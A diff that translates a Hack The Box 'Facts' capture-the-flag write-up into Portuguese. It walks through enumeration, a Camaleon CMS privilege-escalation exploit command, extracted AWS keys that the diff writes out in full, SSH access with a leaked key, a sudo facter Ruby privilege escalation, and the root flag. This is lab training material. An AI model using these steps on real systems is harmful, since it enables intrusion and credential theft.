@@ -7,15 +7,15 @@
 
 ---
 
-# Machine Information
+# Informações da Máquina
 
-| Name  | Difficulty | Platform     | OS    |
+| Nome  | Dificuldade | Plataforma     | OS    |
 | ----- | ---------- | ------------ | ----- |
 | Facts | Easy       | Hack The Box | Linux |
 
 ---
 
-# Attack Path
+# Superfície de ataque
 
 ```
 1. Nmap scan → descoberta de HTTP e SSH
@@ -30,25 +30,25 @@
 
 ---
 
-# Reconnaissance
+# Reconhecimento
 
-Initial enumeration was performed with Nmap.
+A enumeração inicial foi realizada com Nmap.
 
 ``` nmap -sV -T5 -sC 10.129.19.58 ```
 
 
 ![Nmap Scan](screenshots/nmap.png)
 
-### Findings
+### Descobertas
 
-| Port | Service | Notes                  |
+| Porta | Serviço | Observações                  |
 | ---- | ------- | ---------------------- |
 | 22   | SSH     | OpenSSH 9.9p1         |
 | 80   | HTTP    | nginx (Ubuntu)        |
 
 ---
 
-# Web Enumeration
+# Enumeração Web
 
 A aplicação web rodando na porta 80 revelou um site chamado **Facts**.
 
@@ -61,7 +61,7 @@ Enumeração com Gobuster:
 
 ![Gobuster](screenshots/gobuster.png)
 
-### Findings
+### Descobertas
 
 - `/admin` → redireciona para `/admin/login`
 - Diretórios ocultos (.git, .env-like, etc)
@@ -69,7 +69,7 @@ Enumeração com Gobuster:
 
 ---
 
-# Exploitation
+# Exploração
 
 A aplicação utiliza o **Camaleon CMS v2.9.0**, vulnerável a:
 
@@ -86,14 +86,14 @@ Exploit utilizado: ``` python exploit.py -u http://facts.htb/ -U abc -P abc -e -
 - Extração de credenciais AWS S3:
 
 ```
-Access Key: AKIA...
-Secret Key: AiZz...
+Access Key: AKIA13F1EA8B94A4DE85
+Secret Key: AiZzRMmU6R3jv2SYM6D5hLjifqmIGCio9L0g/R2r
 Endpoint: http://localhost:54321
 ```
 
 ---
 
-# Initial Access
+# Acesso Inicial
 
 Utilizando AWS CLI: ``` aws --endpoint-url http://facts.htb:54321 s3 ls ```
 
@@ -127,7 +127,7 @@ Login SSH: ``` ssh -i id_ed25519 trivia@10.129.19.58 ```
 
 ---
 
-# User Flag
+# Flag de Usuário
 
 ``` cat /home/william/user.txt ```
 
@@ -138,7 +138,7 @@ Login SSH: ``` ssh -i id_ed25519 trivia@10.129.19.58 ```
 
 ---
 
-# Privilege Escalation
+# Escalação de Privilégio
 
 Verificação de permissões sudo: ``` sudo -l ```
 
@@ -150,7 +150,7 @@ User trivia may run:
 
 ---
 
-# Exploiting Privilege Escalation
+# Explorando a Escalação de Privilégio
 
 O `facter` permite execução de código Ruby arbitrário.
 
@@ -167,7 +167,7 @@ end
 
 Execução: ``` sudo facter --custom-dir=/tmp pwn ```
 
-# Root Flag
+# Flag de Root
 
 ``` cat /root/root.txt ```
 
@@ -175,44 +175,45 @@ Execução: ``` sudo facter --custom-dir=/tmp pwn ```
 
 ``` a09e07c25af8e613bfc5747fb73823d3 ```
 
-# Vulnerabilities Identified
+# Vulnerabilidades Identificadas
 
-### Camaleon CMS Privilege Escalation (CVE-2025-2304)
+### Escalação de Privilégio no Camaleon CMS (CVE-2025-2304)
 
-Description:
+Descrição:
 
 - Vulnerabilidade autenticada que permite elevação de privilégios
 - Permite acesso a dados sensíveis (credenciais)
 
-Impact:
+Impacto:
 
 - Comprometimento total da aplicação
 - Acesso a infraestrutura interna (S3)
 
-### Insecure S3 Exposure
+### Exposição Insegura de S3
 
-Description:
+Descrição:
 
 - Bucket S3 interno acessível
 - Continha arquivos sensíveis (.ssh)
 
-Impact:
+Impacto:
 
 - Exposição de chave privada SSH
 - Acesso direto ao sistema
 
-### Misconfigured sudo (facter)
+### Má Configuração de sudo (facter)
 
-Description:
+Descrição:
 
 - Execução de binário com privilégios root
 - Permite execução de código Ruby
 
-Impact:
+Impacto:
 
 - Escalação completa para root
 
-# Tools Used
+# Ferramentas Utilizadas
+
 * Nmap
 * Gobuster
 * AWS CLI
@@ -221,12 +222,13 @@ Impact:
 * Python exploit
 * Facter
 
-# Key Takeaways
+# Principais Aprendizados
+
 * Sempre verificar CMS e versão → exploits públicos
 * Credenciais expostas frequentemente levam ao comprometimento completo
 * Buckets S3 mal configurados são críticos
 * sudo com binários interpretados (Ruby/Python) = privesc fácil
 
-# Author
+# Autor
 
 GitHub: https://github.com/ninjaa-exe
